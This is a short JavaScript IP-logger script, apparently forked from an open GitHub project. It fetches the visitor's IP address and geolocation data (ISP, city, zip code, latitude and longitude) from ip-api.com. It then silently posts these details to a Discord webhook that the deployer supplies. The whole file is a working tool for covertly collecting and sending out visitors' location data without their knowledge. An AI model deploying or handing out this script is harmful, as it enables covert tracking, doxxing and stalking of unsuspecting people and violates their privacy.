// Paste your Discord Webhook API URL into Line 3: WEBHOOKURL => YOUR API URL

var webHookUrl = "YOUR_WEBHOOK_URL_HERE";

/*
    Forked from: https://github.com/luisoos/IP-Log-To-Discord-Webhook
    License: MIT
*/

const request = async () => { // Calling a "synchronous" fetch
    const response = await fetch('https://ip-api.com/json/');
    const data = await response.json();

    // Declaring variables
    var ip = data.query;

    var provider = data.org + " (" + data.as + ")";

    var timezone = data.timezone;
    var country = data.country;
    var countryCode = data.countryCode.toLowerCase()
    var region = data.region + " (" + data.regionName + ")";
    var city = data.city;

    var zip = data.zip;
    var lat = data.lat;
    var lon = data.lon;

    // Open POST Request
    var postRequest = new XMLHttpRequest();
    postRequest.open("POST", webHookUrl);

    postRequest.setRequestHeader('Content-type', 'application/json');

    var params = {
        username:   "IP Log",
        avatar_url: "",
        content:    "__**:globe_with_meridians: IP-Adress:**__ \n" 
                    + "`" + ip + "`" + 
                    "\n \n__**:telephone: Provider:**__ \n" 
                    + provider + 
                    "\n \n__**:map: Timezone:**__ \n" 
                    + timezone + 
                    "\n \n__**:flag_" + countryCode + ": Country and Region:**__ \n" 
                    + country + " - " + region + 
                    "\n \n__**:cityscape: Zip Code & City:**__ \n" 
                    + zip + " " + city +
                    "\n \n__**:round_pushpin: Location:**__ \n" 
                    + "**Longitude:** " + lon + "\n"
                    + "**Latitude:** " + lat
    }

    postRequest.send(JSON.stringify(params));

}

request();

